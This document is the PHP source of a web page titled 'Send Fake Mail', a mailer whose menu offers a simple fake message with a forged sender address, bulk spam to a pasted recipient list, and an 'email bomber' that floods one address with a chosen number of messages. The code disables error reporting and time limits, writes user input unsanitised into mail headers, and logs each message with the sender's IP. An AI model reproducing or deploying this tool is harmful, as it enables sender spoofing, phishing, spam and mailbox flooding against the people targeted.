<title>Send Fake Mail </title> 
<style>
body{
	padding: 0px;
	margin: 0px;
}
.header{
	background-color: #0d7eaa;
	color: white;
	text-align:center;
	top:;0px;
	width:100%;
	padding:30px;
	
}

.textinput{
	margin-top:2px;
	height:56px;
	border: 2px solid #000000;
	font-size:32px;
	padding:1px;

}
form
{
	align:center;
}


.btn {
  background: #e03131;
  background-image: -webkit-linear-gradient(top, #e03131, #780808);
  background-image: -moz-linear-gradient(top, #e03131, #780808);
  background-image: -ms-linear-gradient(top, #e03131, #780808);
  background-image: -o-linear-gradient(top, #e03131, #780808);
  background-image: linear-gradient(to bottom, #e03131, #780808);
  -webkit-border-radius: 18;
  -moz-border-radius: 18;
  border-radius: 18px;
  font-family: Georgia;
  color: #ffffff;
  font-size: 26px;
  padding: 10px 20px 10px 20px;
  text-decoration: none;
}

.btn:hover {
  background: #0d7eaa;
  text-decoration: none;
}
table
{
	border:2px solid #0d7eaa;
		align:center;
}	
</style><div class="header">
<font size="14">Send Fake Mail</font></div>
<h1><b>Mailer<br>
SRSCC Mailer  </b> </h1>
<? 
// 
error_reporting (0); 
if(!set_time_limit(0)) { 
$limit = false; 
} else { 
set_time_limit(0); 
ignore_user_abort(1); 
$limit = true; 
} 

$log = 'log.txt'; // Log file 

ini_set('max_execution_time', '0'); 

?> 
set_time_limit(0) = <?if($limit)echo('<font color=Green>On</font>');else 
echo('<font color=Red>Off</font> (Working time is limited with the current settings of the server)');?><br> 
<? 

$ip = getenv('REMOTE_ADDR'); 
if($_GET['mail'] == '1' || $_GET['mail'] == '2' || $_GET['mail'] == '3') 
{ 

$_POST['to'] = stripslashes($_POST['to']); 
$_POST['msg'] = stripslashes($_POST['msg']); 
$_POST['from'] = stripslashes($_POST['from']); 
$_POST['subject'] = stripslashes($_POST['subject']); 

if($_POST['to'] && $_POST['msg'] && $_POST['from'] && $_POST['tipe']) 
{ 
$headers = "MIME-Version: 1.0\r\n"; 
$headers .= "Content-type: text/".$_POST['tipe']."; charset=windows-1251\r\n"; 

$headers .= "From: ".$_POST['from']; 
$fz=$headers;
if($_GET['mail'] == '1') 
{ 
mail($_POST['to'], $_POST['subject'], $_POST['msg'], $headers) or die('Cannot send the message'); 
} 
elseif($_GET['mail'] == '2') 
{ 
$_POST['to'] = explode("\n",$_POST['to']); 
foreach($_POST['to'] as $poluchatels) 
{ 
mail($poluchatels, $_POST['subject'], $_POST['msg'], $headers) or die('Cannot send the message'); 
} 
} 
elseif($_GET['mail'] == '3') 
{ 
if(preg_match('/[0-9]+/',$_POST['kol'])) 
{ 
$f = fopen($log,'a'); 
fwrite($f,'Message sent &'.$_POST['msg'].'& with subject "'.$_POST['subject'].'" for "'.$_POST['to'].'" from IP - "'.$ip."\"\r\n"); 
fclose($f); 
for($i=0;$i<$_POST['kol'];$i++) 
{ 
$r=rand(1,10000);
$headers=$fz.$r."\n";
mail($_POST['to'], $_POST['subject'], $_POST['msg'], $headers) or die('Cannot send the message'); 
sleep(1); 
$headers=$fz;
} 
} 
else 
{ 
echo('Incorrect (or not entered) number of messages'); 
} 
} 
$f = fopen($log,'a'); 
fwrite($f,'Message sent &'.$_POST['msg'].'& with subject "'.$_POST['subject'].'" for "'.$_POST['to'].'" from IP - "'.$ip."\"\r\n"); 
fclose($f); 
echo('<center><b><font color="green">Message succesfully sent</font></b></center>'); 
} 
else 	
{ 
?> 
<table>
<form style="width:350px" method='post'>
<? 
if($_GET['mail'] == '1' || $_GET['mail'] == '3') 
{ 
echo("<tr><td>Receiver</td><td><input type='text'name='to'></td></tr>"); 
} 
?> 
<tr><td>Sender</td><td><input type='text' name='from'></td></tr>
<tr><td>Subject</td><td><input type='text' name='subject'></td></tr>
<? 
if($_GET['mail'] == '3') 
{ 
echo("<tr><td>Amount of messages</td><td><input type='text' name='kol'></td></tr>"); 
} 
?> 
<tr><td>
htm -> <input type='radio' checked='checked' tabindex='1' name='tipe' value='html'> ::</td><td> <input type='radio' name='tipe' value='plain'><- text</td></tr>
<? 
if($_GET['mail'] == '2') 
{ 
echo("<tr><td>Receivers</td><td><textarea name='to' rows='10' cols='30'>abc@gmail.com 
xyz@yahoo.com 
zzz@zzzz.com</textarea></td></tr>"); 
} 
?> 
<tr><td>Message</td><td>
<textarea name='msg' rows='10' cols='30'></textarea></td></tr><tr><td></td><td><input type='submit' vlaue="send" class="btn"> </td></tr>
</form> </table>
<? 
} 
} else { 
?><br> 
<h1>

1. <a href='<?=$_SERVER['PHP_SELF']?>?mail=1'>Send simple fake message</a><br> 
2. <a href='<?=$_SERVER['PHP_SELF']?>?mail=2'>Spam</a><br> 
3. <a href='<?=$_SERVER['PHP_SELF']?>?mail=3'>email bomber</a><br> </h1>
<? 
} 